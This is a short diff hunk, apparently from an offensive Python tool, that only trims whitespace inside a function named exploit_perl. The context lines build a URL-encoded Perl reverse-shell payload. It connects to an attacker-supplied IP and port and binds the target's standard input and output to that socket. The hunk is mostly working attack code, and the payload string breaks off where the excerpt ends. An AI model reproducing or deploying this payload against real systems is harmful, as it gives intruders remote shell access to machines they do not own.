@@ -10,7 +10,7 @@ def exploit_perl(exploit, method, ip, port):
 
     url = exploit['GETVAL']
     post = exploit['POSTVAL']
-    
+
     perlTest = "which%20perl"
     perlPayload = "perl+-e+'use+Socket%3b$i%3d\"" + ip + "\"%3b$p%3d"+str(port)+"%3bsocket(S,PF_INET,SOCK_STREAM,getprotobyname"\
                   "(\"tcp\"))%3bif(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">%26S\")%3bopen(STDOUT,\">%26S\")%3bopen"\
